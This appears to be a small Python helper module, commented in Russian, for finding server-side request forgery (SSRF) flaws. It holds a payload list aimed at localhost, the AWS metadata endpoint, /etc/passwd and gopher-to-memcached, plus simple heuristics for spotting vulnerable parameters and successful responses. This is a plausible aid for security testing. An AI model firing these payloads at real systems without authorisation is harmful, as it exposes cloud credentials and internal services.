# ssrf_helpers.py
# ---------------
# Общие утилиты для SSRF.

def generate_ssrf_payloads():
    """
    Генерирует список URL-адресов, которые обычно используют для SSRF:
    - http://127.0.0.1:80
    - http://localhost:8080
    - http://169.254.169.254/latest/meta-data (AWS metadata)
    - file:///etc/passwd (иногда SSRF позволяет file://)
    - ...
    """
    payloads = [
        "http://127.0.0.1:80",
        "http://127.0.0.1:8080",
        "http://localhost:8000",
        "http://169.254.169.254/latest/meta-data",
        "file:///etc/passwd",
        "gopher://127.0.0.1:11211",  # иногда используют gopher для интеракций
        # ...
    ]
    return payloads

def looks_like_url_param(param_name):
    """
    Упрощённая эвристика:
    Если param_name in ["url", "link", "target", "dest", "uri"] => подозреваем SSRF
    """
    suspicious = ["url", "link", "target", "dest", "uri"]
    return (param_name.lower() in suspicious)

def is_ssrf_suspicious_response(response_text):
    """
    Упрощённая проверка, если сервер вернул что-то вроде "200 OK from local server"
    или "cloud metadata" — может быть признаком SSRF.
    """
    if not response_text:
        return False
    # Для примера:
    markers = [
        "root:x:0:0",
        "METADATA-EC2",
        "EC2 IAM Credentials",
        "Host: 127.0.0.1"
    ]
    lower = response_text.lower()
    for m in markers:
        if m.lower() in lower:
            return True
    return False
